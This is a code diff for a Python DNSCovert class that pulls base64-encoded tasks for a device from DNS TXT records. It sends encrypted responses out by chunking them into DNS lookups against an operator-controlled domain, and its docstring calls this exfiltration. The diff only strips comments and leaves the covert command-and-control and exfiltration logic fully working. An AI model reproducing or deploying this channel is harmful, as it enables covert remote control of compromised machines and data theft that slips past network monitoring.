@@ -8,8 +8,8 @@ import time
 from typing import Dict, List, Any
 
 try:
-    import dns.resolver # type: ignore
-    import dns.message  # type: ignore
+    import dns.resolver
+    import dns.message
     DNS_AVAILABLE = True
 except ImportError:
     DNS_AVAILABLE = False
@@ -27,7 +27,7 @@ class DNSCovert:
             return []
         
         try:
-            # Query for tasks using TXT records
+
             query_domain = f"{device_id}.tasks.{self.domain}"
             
             resolver = dns.resolver.Resolver()
@@ -38,7 +38,7 @@ class DNSCovert:
                 tasks = []
                 
                 for answer in answers:
-                    # Decode base64 encoded task data
+
                     task_data = base64.b64decode(str(answer).strip('"'))
                     task = json.loads(task_data.decode())
                     tasks.append(task)
@@ -46,7 +46,7 @@ class DNSCovert:
                 return tasks
                 
             except dns.resolver.NXDOMAIN:
-                # No tasks available
+
                 return []
                 
         except Exception as e:
@@ -56,10 +56,10 @@ class DNSCovert:
     def post_response(self, device_id: str, encrypted_data: bytes) -> bool:
         """Exfiltrate response via DNS queries"""
         try:
-            # Encode response as base64 and split into DNS-safe chunks
+
             encoded_data = base64.b64encode(encrypted_data).decode()
             
-            # DNS labels are limited to 63 characters
+
             chunk_size = 60
             chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
             
@@ -67,10 +67,10 @@ class DNSCovert:
                 query_domain = f"{chunk}.{i}.{device_id}.data.{self.domain}"
                 
                 try:
-                    # Perform DNS query to exfiltrate data
+
                     socket.gethostbyname(query_domain)
                 except socket.gaierror:
-                    # Expected - we're just sending data via DNS queries
+
                     pass
             
             return True
